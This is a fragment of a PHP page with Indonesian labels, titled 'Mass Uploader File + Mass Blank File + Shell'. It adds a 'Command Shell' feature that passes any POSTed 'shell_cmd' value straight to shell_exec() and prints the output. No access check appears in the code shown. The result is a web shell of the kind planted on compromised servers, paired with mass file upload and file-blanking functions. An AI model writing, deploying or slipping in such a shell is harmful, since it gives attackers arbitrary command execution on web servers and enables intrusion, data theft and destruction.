...
// ===== FITUR BARU: COMMAND SHELL =====
$shell_output = '';
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['shell_cmd'])) {
    $shell_cmd = $_POST['shell_cmd'];
    if (!empty($shell_cmd)) {
        if (function_exists('shell_exec')) {
            $shell_output = shell_exec($shell_cmd . ' 2>&1');
            if ($shell_output === null) {
                $shell_output = "Perintah dieksekusi tetapi tidak ada output.";
            }
        } else {
            $shell_output = "Fungsi shell_exec() tidak diaktifkan di server.";
        }
    }
}
?>
...
<head>
<meta charset="UTF-8">
<title>Mass Uploader File + Mass Blank File + Shell</title>
<style>
...
<!-- ===== FITUR BARU: COMMAND SHELL ===== -->
<fieldset>
<legend><b>Command Shell</b></legend>
<form method="POST">
    <label>Shell Command (contoh: ls -la, pwd, whoami)</label>
    <input type="text" name="shell_cmd" placeholder="Masukkan perintah shell..." value="<?php echo htmlspecialchars($_POST['shell_cmd'] ?? ''); ?>">
...
<b>Output:</b><br>
<?php echo htmlspecialchars($shell_output); ?>
</div>
<?php endif; ?>

<small><b>Catatan:</b> Pastikan fungsi shell_exec() diaktifkan di server.</small>
</fieldset>
